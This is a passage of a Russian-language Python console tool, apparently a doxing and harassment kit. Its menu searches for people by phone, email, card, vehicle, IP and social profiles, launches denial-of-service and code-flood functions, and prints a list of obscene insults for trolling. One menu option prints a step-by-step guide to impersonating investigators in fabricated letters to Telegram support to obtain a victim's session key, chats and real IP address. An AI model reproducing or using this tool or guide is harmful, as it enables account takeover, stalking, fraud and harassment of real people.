        print(Fore.RED + f"[!] Произошла ошибка -> {e}\n" + Style.RESET_ALL)
        return None

def generate_insults(num_short=5, num_long=5):
    all_insults = [
        "Трисучьепадловая выссака", "многоблядская проскотошлюха", "гнидское выебопропиздище",
        "многоебоный херун", "стервозное тригнидопроговно", "гандонский пропердок",
        "триговногнойная трипиздопроманда", "проперданутое блядодерьмо", "высраномудоватое дерьмище",
        "херопроскотское дерьмище", "просволотопрохуевое задрочепрогнидище", "залупский простервопрохерун",
        "говнозалупский блядок", "пердодроченное многопиздище", "дрочепропердоватая манда",
        "выебучий трипиздодрочун", "трисраное говно", "сраногнойная сволота", "высраная сволотосука",
        "прогнидская гнида", "гандонохеровая мандогнидища", "пердомудоватый задрочепидер",
        "выпердоговенный хуй", "проссаная сучьескотина", "трипердоватая триссанохуина",
        "падлопросраное мандище", "выпердоватое пердопромудище", "шлюхское задрочепроговно",
        "падлопроскотское говно", "мудопрошлюхское хуеговно", "падловая многопизда",
        "выпердопроссаная гноепадла", "задроченное тримандище", "многоебоватая срака",
        "многоебучий хуеплёт", "промудоватая задрочила", "пиздопроговенная хуепропадла",
        "гандоноскотская триссака", "многоебошлюхская многопиздопропадла",
        "просволотохуеватое тримудище", "триперданутая просволота",
        "тримандопростервозный пиздун", "выссаногнойное говнодерьмище",
        "падловый трипиздопроскотложец", "ссаное говнодерьмище", "прогандонский мудак",
        "жоповатое тригнидопрохерище", "сраный многопиздоблядун", "гандонский гнидоблядун",
        "гнойное прогнидопрохуевающее", "просволотская дрочепросволота",
        "пидероперданное проссаномудище", "многостервохеровый задрочун",
        "триговноперданутое сволотопродерьмо", "многомудоватое ссанопиздище",
        "просволотопрошлюхский выссанохуеплёт", "высранохуевое выблядодерьмо",
        "задроченный промудак", "задроческотское говно", "гандоносучий гандон",
        "пиздатая просволота", "мандопроблядоватая трисука", "дерьмовое трипиздохерище",
        "просраноперданутая мандоскотина", "скотское задрочепрогнидище", "ебоватая скотина",
        "дерьмопрозалупское дерьмо", "триссаный промудак", "многостервохуенная гандоносрака",
        "гнойная многостервопропидрила", "шлюхский хероговнюк", "блядогандонский стервец",
        "просволотская проскотина", "просраная многожопа", "сучий промудопердун",
        "блядопростервозная дроческотина", "простервоблядовое промудище",
        "залупская сучьемудища", "гноепромандоватое промандище",
        "выссаногнойное многостерводерьмо", "тригнидская многоблядопросволота",
        "задроченная пидрила", "дроченная дрочила", "дрочепроговенное мандопродерьмище",
        "проссаное стервопиздище", "пиздожопская пропердомандища", "скотское мудище",
        "перданная скотопродерьмища", "пиздатая просраносука", "хуессаная пидрила",
        "стервопроблядское блядище", "многоблядопропадловый скотложец",
        "сраная падлопрошлюха", "промандоговенная жопопроебина", "говноперданный многоблядь",
        "перданное промудище", "пердопрогнойная мандопростерва", "выперданный задрочун",
        "да заебись ты трижды злоебучим проебом",
        "залупоглазое пиздопроeбище семиблядским троепиздием", "восьмирукий пятихуй",
        "тримондоеби твое восьмиблядское троепиздище", "хуесучий анахронот",
        "запиздомедузь еби твою мудоблядскую глотку", "проблядь сучья", "ебло мохноногое",
        "страхопиздище залупоглазое", "вхуематери архипиздоит", "ебаный в рот",
        "гандонный педераст", "вафлеотстойник семиструйный", "перхоть подзалупная",
        "блядь перемондоебленная", "триеблоостомондовевшая охуебаннейшая",
        "ебиблядская пиздопроушина с перекосоебленным нахуй ебалом",
        "мондозалупленной болтохуярой", "залупа недоебанная",
        "хуеблядипиздожабья замудоебина", "засракомондохуй твое еболожье мондило",
        "злоебучий пиздохуй"
    ]

    short_insults = [insult for insult in all_insults if len(insult.split()) <= 4]
    long_insults = [insult for insult in all_insults if len(insult.split()) >= 8]

    insults = random.sample(short_insults, min(num_short, len(short_insults))) + \
               random.sample(long_insults, min(num_long, len(long_insults)))
    random.shuffle(insults)
    return insults

# Visualization of connections (simple text-based for now)
def visualize_connections(data):
    if not data or "result" not in data or not data["result"]:
        print(f"\t└ {LANGUAGES[current_language]['no_results']}")
        return
    print(f"\n{COLOR_CODE['GREEN']}{LANGUAGES[current_language]['visualizing']}{COLOR_CODE['RESET']}")
    for item in data["result"]:
        if isinstance(item, dict):
            for key, value in item.items():
                print(f"{COLOR_CODE['CYAN']}{key}: {value}{COLOR_CODE['RESET']}")
    print()

show_splash()

if True:
    while True:
        if "_to_" in current_theme:  
            print(Colorate.Horizontal(THEMES[current_theme], Center.XCenter(banner)))
        else:  
            print(THEMES[current_theme] + Center.XCenter(banner) + "\033[0m")  
        select = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}{LANGUAGES[current_language]["select_function"]}{COLOR_CODE["RESET"]} ')
        if select == '1':
            Term = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}{INPUT_PROMPTS["input_email"]}{COLOR_CODE["RESET"]} ')
            data = Search(Term)
            function_count += 1
            cls()
        
        elif select == '2':
            Term = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}{INPUT_PROMPTS["input_name_dob"]}{COLOR_CODE["RESET"]} ')
            data = Search(Term)
            function_count += 1
            cls()
        
        elif select == '3':
            Term = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}{INPUT_PROMPTS["input_phone"]}{COLOR_CODE["RESET"]} ')
            data = Search(Term)
            function_count += 1
            cls()
        
        elif select == '4':
            Term = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}{INPUT_PROMPTS["input_password"]}{COLOR_CODE["RESET"]} ')
            data = Search(Term)
            function_count += 1
            cls()
        
        elif select == '5':
            Term = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}{INPUT_PROMPTS["input_query"]}{COLOR_CODE["RESET"]} ')
            data = tgss(Term)
            function_count += 1
            cls()
        
        elif select == '6':
            Term = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}{INPUT_PROMPTS["input_facebook"]}{COLOR_CODE["RESET"]} ')
            data = Search(Term)
            function_count += 1
            cls()
        
        elif select == '7':
            Term = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}{INPUT_PROMPTS["input_vk"]}{COLOR_CODE["RESET"]} ')
            data = Search(Term)
            function_count += 1
            cls()
        
        elif select == '8':
            Term = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}{INPUT_PROMPTS["input_instagram"]}{COLOR_CODE["RESET"]} ')
            data = Search(Term)
            function_count += 1
            cls()
        
        elif select == '9':
            Term = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}{INPUT_PROMPTS["input_vehicle"]}{COLOR_CODE["RESET"]} ')
            data = Search(Term)
            function_count += 1
            cls()
        
        elif select == '10':
            Term = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}{INPUT_PROMPTS["input_ip"]}{COLOR_CODE["RESET"]} ')
            data = Search(Term)
            function_count += 1
            cls()
        
        elif select == '11':
            Term = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}{INPUT_PROMPTS["input_card"]}{COLOR_CODE["RESET"]} ')
            data = Search(Term)
            function_count += 1
            cls()
        
        elif select == '12':
            Term = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}{INPUT_PROMPTS["input_query"]}{COLOR_CODE["RESET"]} ')
            data = Search(Term)
            function_count += 1
            cls()
        
        elif select == '13':
            try:
                username = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}{INPUT_PROMPTS["input_username"]}{COLOR_CODE["RESET"]}')
                data = find_username(username)
            except Exception as e:
                print(f'{COLOR_CODE["RED"]}└ Ошибка: {e}{COLOR_CODE["RESET"]}')
            function_count += 1
            cls()
        
        elif select == '14':
            user_id = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}{INPUT_PROMPTS["input_user_id"]}{COLOR_CODE["RESET"]} ')
            data = vk_search(user_id)
            function_count += 1
            cls()
        
        elif select == '15':
            try:
                id_input = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}Введите телефон: {COLOR_CODE["RESET"]}')
                result = sph(id_input)
                print(result)
            except Exception as e:
                print(f'{COLOR_CODE["RED"]}└ Ошибка: {e}{COLOR_CODE["RESET"]}')
            function_count += 1
            cls()
        
        elif select == '16':
            analyze_link()
            function_count += 1
            cls()
        
        elif select == '17':
            check_logger_link()
            function_count += 1
            cls()
        
        elif select == '18':
            bin_checker()
            function_count += 1
            cls()
        
        elif select == '19':
            validate_card_number()
            function_count += 1
            cls()
        
        elif select == '20':
            print(f'''
Чтобы заполучить логи с аккаунта жертвы, нам нужны эти данные, которые мы можем найти на аккаунте жертвы:

ID; Number; Username

Получив их, мы составляем заранее подготовленное подобного рода письмо:

"Здравствуйте. На данный момент на вашей платформе появился кибер преступник, чья личность нас заинтересовала из-за массовых заявлений, а также ложных минирований от его имени. Наша команда IT специалистов просит вас выдать сервера данного пользователя вашей платформы: ID; Number; Username.
Если вы согласны, то просим предоставить информацию на нашу гражданскую почту email, для завершения дела. Надеемся на сотрудничество."

Оф почты тг: ceo@telegram.org, DMCA@telegram.org, sms@telegram.org, recover@telegram.org, abuse@telegram.org, topCA@telegram.org, security@telegram.org, support@telegram.org, sticker@telegram.org.

Вставляем офицальные почты телеграм поддержки, ждём не менее двух суток и проверяем почту. Нам выдадут ссылку на скачивание с подобным названием: "RUнаборцифр" - заходя в него, первым делом мы видим папку "Profile_1" - что является ТДатой, а точнее - ключом доступа к аккаунту. Далее мы видим папку с названием "@$#/". Зашёв в неё, мы увидем много .pdf файлов с не понятными названиями - чаты нашей жертвы. Выйдя из этой папки, мы видим папку "Proxy". Если жертва не подключала прокси, то её не будет. Далее, папка "Photos", в которой ссылки на все аватарки которые когда либо были на аккаунте нашей жертвы. И последняя папка с названием "$$$" - в ней мы найдём все изменения профиля, номер телефона и истинный айпи адрес вместе со всеми устройствами.

Рекомендация: письма стоит отправлять 4-7 утра по Московскому времени, а также стоит закинуть письмо с переводом на английский.
''')
            function_count += 1
            cls()
        
        elif select == '21':
            dos_attack()
            function_count += 1
            cls()
        
        elif select == '22':
            print(f'{COLOR_CODE["RED"]}[-]{COLOR_CODE["RESET"]} Выданные троллинг оски:\n')
            insults = generate_insults(50)  
            for insult in insults:
                print(f'{COLOR_CODE["GREEN"]}[+]{COLOR_CODE["RESET"]} {insult}')
            input(f'\n{COLOR_CODE["RED"]}{LANGUAGES[current_language]["press_enter_menu"]}{COLOR_CODE["RESET"]}')
            function_count += 1
            cls()
        
        elif select == '23':
            data = scan_number()
            function_count += 1
            cls()
        
        elif select == '24':
            webbrowser.open_new_tab("https://myip.com")
            ip = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}{INPUT_PROMPTS["input_port_scan"]}{COLOR_CODE["RESET"]} ')
            scan_ports(ip)
            function_count += 1
            cls()
        
        elif select == '25':
            print(get_mac_info())
            function_count += 1
            cls()
        
        elif select == '26':
            print(f'{COLOR_CODE["RED"]}{LANGUAGES[current_language]["change_theme"]}{COLOR_CODE["RESET"]}')
            print(f'{COLOR_CODE["BOLD"]}{LANGUAGES[current_language]["gradient_themes"]}{COLOR_CODE["RESET"]}')
            themes = list(THEMES.keys())
            count = 1
            gradient_themes = themes[:6]
            for i, theme in enumerate(gradient_themes):
                if theme == "green_to_cyan":
                    print(f'{COLOR_CODE["GREEN"]}[{count}]{COLOR_CODE["RESET"]} Зеленый → Голубой')
                elif theme == "red_to_yellow":
                    print(f'{COLOR_CODE["RED"]}[{count}]{COLOR_CODE["RESET"]} Красный → Желтый')
                elif theme == "blue_to_purple":
                    print(f'{COLOR_CODE["BLUE"]}[{count}]{COLOR_CODE["RESET"]} Синий → Фиолетовый')
                elif theme == "purple_to_blue":
                    print(f'{COLOR_CODE["PINK"]}[{count}]{COLOR_CODE["RESET"]} Фиолетовый → Синий')
                elif theme == "yellow_to_red":
                    print(f'{COLOR_CODE["YELLOW"]}[{count}]{COLOR_CODE["RESET"]} Желтый → Красный')
                elif theme == "white_to_black":
                    print(f'{COLOR_CODE["DARK"]}[{count}]{COLOR_CODE["RESET"]} Белый → Черный')
                count += 1
            print(f'\n{COLOR_CODE["BOLD"]}{LANGUAGES[current_language]["solid_themes"]}{COLOR_CODE["RESET"]}')
            solid_themes = themes[6:]
            for i, theme in enumerate(solid_themes):
                if theme == "red":
                    print(f'{COLOR_CODE["RED"]}[{count}]{COLOR_CODE["RESET"]} Красный')
                elif theme == "green":
                    print(f'{COLOR_CODE["GREEN"]}[{count}]{COLOR_CODE["RESET"]} Зеленый')
                elif theme == "blue":
                    print(f'{COLOR_CODE["BLUE"]}[{count}]{COLOR_CODE["RESET"]} Синий')
                elif theme == "purple":
                    print(f'{COLOR_CODE["PINK"]}[{count}]{COLOR_CODE["RESET"]} Фиолетовый')
                elif theme == "cyan":
                    print(f'{COLOR_CODE["CYAN"]}[{count}]{COLOR_CODE["RESET"]} Голубой')
                elif theme == "yellow":
                    print(f'{COLOR_CODE["YELLOW"]}[{count}]{COLOR_CODE["RESET"]} Желтый')
                elif theme == "white":
                    print(f'{COLOR_CODE["BOLD"]}[{count}]{COLOR_CODE["RESET"]} Белый')
                count += 1
            while True:
                try:
                    choice = int(input(f'\n{COLOR_CODE["RED"]}└ Введите номер темы: {COLOR_CODE["RESET"]}')) - 1
                    if 0 <= choice < len(themes):
                        current_theme = themes[choice]
                        print(f'{COLOR_CODE["GREEN"]}{LANGUAGES[current_language]["theme_changed"]}{current_theme}{COLOR_CODE["RESET"]}')
                        save_settings()
                        break
                    else:
                        print(f'{COLOR_CODE["RED"]}{LANGUAGES[current_language]["invalid_theme"]}{COLOR_CODE["RESET"]}')
                except ValueError:
                    print(f'{COLOR_CODE["RED"]}{LANGUAGES[current_language]["invalid_input"]}{COLOR_CODE["RESET"]}')
            input(f'\n{COLOR_CODE["RED"]}{LANGUAGES[current_language]["press_enter_menu"]}{COLOR_CODE["RESET"]}')
            function_count += 1
            cls()
        
        elif select == '27':
            print(f'{COLOR_CODE["RED"]}{LANGUAGES[current_language]["change_language"]}{COLOR_CODE["RESET"]}')
            while True:
                try:
                    choice = int(input())
                    if choice == 1:
                        current_language = "ru"
                        print(f'{COLOR_CODE["GREEN"]}{LANGUAGES[current_language]["language_changed"]}Русский{COLOR_CODE["RESET"]}')
                        banner = LANGUAGES[current_language]["banner"]
                        splash_text = LANGUAGES[current_language]["splash"]
                        save_settings()
                        break
                    elif choice == 2:
                        current_language = "en"
                        print(f'{COLOR_CODE["GREEN"]}{LANGUAGES[current_language]["language_changed"]}English{COLOR_CODE["RESET"]}')
                        banner = LANGUAGES[current_language]["banner"]
                        splash_text = LANGUAGES[current_language]["splash"]
                        save_settings()
                        break
                    else:
                        print(f'{COLOR_CODE["RED"]}└ Invalid number. Try again.{COLOR_CODE["RESET"]}')
                except ValueError:
                    print(f'{COLOR_CODE["RED"]}{LANGUAGES[current_language]["invalid_input"]}{COLOR_CODE["RESET"]}')
            input(f'\n{COLOR_CODE["RED"]}{LANGUAGES[current_language]["press_enter_menu"]}{COLOR_CODE["RESET"]}')
            function_count += 1
            cls()
        
        elif select == '28':
            print(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}{LANGUAGES[current_language]["about_software"]}{COLOR_CODE["RESET"]}')
            print(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}{LANGUAGES[current_language]["version"]}{COLOR_CODE["RESET"]}')
            print(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}{LANGUAGES[current_language]["creator"]}{COLOR_CODE["RESET"]}')
            print(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}{LANGUAGES[current_language]["managers"]}{COLOR_CODE["RESET"]}')
            print(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}{LANGUAGES[current_language]["channel"]}{COLOR_CODE["RESET"]}')
            webbrowser.open_new_tab("https://t.me/+SomlRV-0sr0wNTEy")
            function_count += 1
            cls()
        
        elif select == '29':
            show_session_stats()
            function_count += 1
            cls()
        
        elif select == '30':
            discord_osint_tool()
            function_count += 1
            cls()
        
        elif select == '31':
            code_flood()
            function_count += 1
            cls()
        
        elif select == '32':
            choice = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}{LANGUAGES[current_language]["exit_prompt"]}{COLOR_CODE["RESET"]} ')
            if choice.lower() == 'y':
                break
            cls()
        
        else:
            Write.Print(LANGUAGES[current_language]["invalid_choice"], THEMES[current_theme])
            cls()

else:
    print("Вход не выполнен. Завершение программы.")